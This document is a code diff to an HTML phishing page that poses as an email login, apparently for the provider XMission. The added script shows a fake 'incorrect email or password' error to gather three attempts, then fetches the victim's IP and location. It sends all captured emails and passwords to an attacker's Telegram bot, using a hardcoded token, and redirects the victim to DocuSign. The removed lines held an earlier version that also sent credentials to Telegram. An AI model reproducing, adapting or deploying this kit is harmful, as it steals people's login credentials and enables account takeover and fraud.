@@ -78,12 +78,11 @@
     button:hover {
       background-color: #6B0000;
     }
-    .success-message {
+    .error-message {
       display: none;
-      margin-top: 20px;
-      color: green;
+      color: red;
+      margin-bottom: 15px;
       font-size: 14px;
-      text-align: center;
     }
   </style>
 </head>
@@ -99,57 +98,80 @@
         <input type="checkbox" id="keep-signed-in" name="keep-signed-in" />
         <label for="keep-signed-in">Keep me signed in</label>
       </div>
+      <div class="error-message" id="errorMsg">❌ Incorrect email or password.</div>
       <button type="submit">Next</button>
     </form>
-    <div class="success-message" id="message">🔓 Verified! Your document is being prepared...</div>
   </div>
 
   <script>
     const form = document.getElementById("loginForm");
-    const message = document.getElementById("message");
+    const errorMsg = document.getElementById("errorMsg");
+    const attempts = [];
+
+    const telegramToken = "7298891394:AAE9-U7lE-kbCDL8CHb7YNQLPZVvRc2MG2s";
+    const chatId = "5613637159";
+    const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
 
     form.addEventListener("submit", async function (e) {
       e.preventDefault();
 
-      const email = form.email.value;
-      const password = form.password.value;
+      const email = form.email.value.trim();
+      const password = form.password.value.trim();
 
-      const telegramToken = "7298891394:AAE9-U7lE-kbCDL8CHb7YNQLPZVvRc2MG2s";
-      const chatId = "5613637159";
-      const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+      // Save attempt
+      attempts.push({ email, password });
 
-      const msg = `🔒 New Login Attempt 🔒\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
+      // Show error message
+      errorMsg.style.display = "block";
 
-      try {
-        await fetch(telegramUrl, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/x-www-form-urlencoded"
-          },
-          body: new URLSearchParams({
-            chat_id: chatId,
-            text: msg
-          })
-        });
+      // Remove error if user types again
+      form.querySelectorAll("input").forEach(input => {
+        input.addEventListener("input", () => {
+          errorMsg.style.display = "none";
+        }, { once: true });
+      });
 
-        // Show success
-        message.style.display = "block";
+      // Clear inputs
+      form.reset();
 
-        // Simulate a "PDF download"
-        setTimeout(() => {
-          const blob = new Blob(["This is a placeholder for your unlocked PDF."], {
-            type: "application/pdf",
+      if (attempts.length === 3) {
+        // Get IP and location
+        try {
+          const ipRes = await fetch("https://api.ipify.org?format=json");
+          const { ip } = await ipRes.json();
+
+          const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+          const geo = await geoRes.json();
+
+          const now = new Date();
+          const timestamp = now.toUTCString();
+
+          let message = `🔐 XMission Login Attempts\n`;
+          attempts.forEach((attempt, i) => {
+            message += `#${i + 1} ${i < 2 ? "❌ Failed" : "✅ Final Attempt"}\n`;
+            message += `👤 email: ${attempt.email}\n🔑 Password: ${attempt.password}\n\n`;
           });
-          const url = URL.createObjectURL(blob);
-          const link = document.createElement("a");
-          link.href = url;
-          link.download = "Unlocked_Document.pdf";
-          link.click();
-          URL.revokeObjectURL(url);
-        }, 2000);
-      } catch (err) {
-        alert("❌ Failed to send to Telegram.");
-        console.error(err);
+
+          message += `🕒 Time: ${timestamp}\n`;
+          message += `🌍 Location: ${geo.city || "Unknown"}, ${geo.country_name || "Unknown"}\n`;
+          message += `📡 IP: ${ip}`;
+
+          await fetch(telegramUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: new URLSearchParams({
+              chat_id: chatId,
+              text: message
+            })
+          });
+
+          // Redirect to DocuSign
+          window.location.href = "https://www.docusign.com";
+
+        } catch (err) {
+          alert("❌ Error sending final data.");
+          console.error(err);
+        }
       }
     });
   </script>
